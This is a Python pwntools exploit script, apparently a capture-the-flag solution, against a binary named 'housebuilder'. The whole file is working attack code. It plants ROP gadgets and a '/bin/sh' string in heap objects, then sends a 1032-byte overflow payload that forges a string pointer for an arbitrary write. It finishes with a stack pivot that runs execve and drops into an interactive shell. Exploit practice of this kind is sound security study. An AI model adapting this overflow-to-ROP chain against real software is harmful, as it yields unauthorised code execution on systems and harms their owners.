#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "./housebuilder"

IP = "IP_ADDR"
PORT = None

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
b *0x4a7d04
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

def sell_house(idx):
    r.sendline(b"2")
    r.recvuntil(": ")
    r.sendline(str(idx).encode())
    r.recvuntil("> ")
    r.sendline(b"3")
    r.recvuntil("> ")
    r.sendline(b"4")
    r.recvuntil("> ")

def create_house(name, rooms, floors, peoples, pwn=0):
    r.sendline(b"1")
    r.recvuntil(": ")
    r.sendline(name)
    r.recvuntil(": ")
    r.sendline(str(rooms).encode())
    r.recvuntil(": ")
    r.sendline(str(floors).encode())
    r.recvuntil(": ")
    r.sendline(str(peoples).encode())

    if pwn:
        r.interactive()
    r.recvuntil("> ")

# SPLOIT #
r.recvuntil("> ")
create_house(b"aaaa", 16, 32, 48) # idx 0
create_house(b"bbbb", 1, 2, 3) # idx 1

create_house(b"oooo", 0, 0, 0x68732f6e69622f) # 2
create_house(b"cccc", 0, 0, 0x4044cf) # pop rdx; ret
create_house(b"dddd", 0, 0, 0x0) # 0x0 
create_house(b"ffff", 0, 0, 0x407668) # pop rsi; ret
create_house(b"hhhh", 0, 0, 0x0) # 0x0
create_house(b"llll", 0, 0, 0x41fcba) # pop rax; ret
create_house(b"kkkk", 0, 0, 0x3b) # syscall execve
create_house(b"mmmm", 0, 0, 0x40490a) # pop rdi; ret
create_house(b"jjjj", 0, 0, 0x5D66E0) # bin sh ptr
create_house(b"pppp", 0, 0, 0x403c73) # syscall

for i in range(10):
    sell_house(i+2)

# PWN!
r.sendline(b"2")
r.recvuntil(b": ")
r.sendline(b"0")
r.recvuntil(b"> ")
r.sendline(b"2")
r.recvuntil(b": ")

payload = b'a' * 1032 # junk
payload += p64(0x51) # chunk size
payload += p64(0x13) # rooms 
payload += p64(0x37) # floors 
payload += p64(0x1337) # peoples
payload += p64(0x5948D0) # std::string pointer to string
payload += p64(0x4) # size of name
payload += p64(0x0) * 2
payload += p64(0x5D4BB0) # address to rewrite


r.sendline(payload)
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b"> ")

r.sendline(b"2")
r.recvuntil(b": ")
r.sendline(b"1") # home idx to enter
r.recvuntil(b"> ")
r.sendline(b"2") # AW
r.recvuntil(b": ")
r.sendline(p64(0x4a7d04)) # mov rsp, rcx; pop rcx; jmp rcx
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b"> ")

create_house(p64(0x5D66E8), 1, 2, 3, 1)

r.interactive()
